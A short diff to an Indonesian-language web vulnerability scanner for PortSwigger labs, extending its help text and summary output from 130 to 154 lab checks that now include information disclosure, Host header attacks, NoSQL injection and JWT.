-    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF, HTTP request smuggling, OS command injection & Web cache poisoning (130 lab)")
+    parser = argparse.ArgumentParser(description="SATRIA Engine — pemindai SQL injection, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF, HTTP request smuggling, OS command injection, Web cache poisoning, Information disclosure, HTTP Host header attacks, NoSQL injection & JWT (154 lab)")
     parser.add_argument("target", help="URL target HTTP/HTTPS (mis. URL instance lab PortSwigger)")
     parser.add_argument("--authorized", action="store_true", help="Wajib: Anda menyatakan memiliki izin pengujian.")
     parser.add_argument("--allow-private", action="store_true", help="Izinkan target localhost/private (untuk pengujian lokal).")
@@ -5221,7 +6105,7 @@ def main(argv: list[str] | None = None) -> int:
         return 1
     json_path, html_path = write_report(report, Path(args.output_dir))
     summary = report["summary"]
-    print(f"SATRIA Engine selesai: {summary['confirmed']}/130 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
+    print(f"SATRIA Engine selesai: {summary['confirmed']}/154 lab terkonfirmasi, {summary['not_confirmed']} belum terkonfirmasi.")
     print(f"JSON: {json_path}")
     print(f"HTML: {html_path}")
     return 0
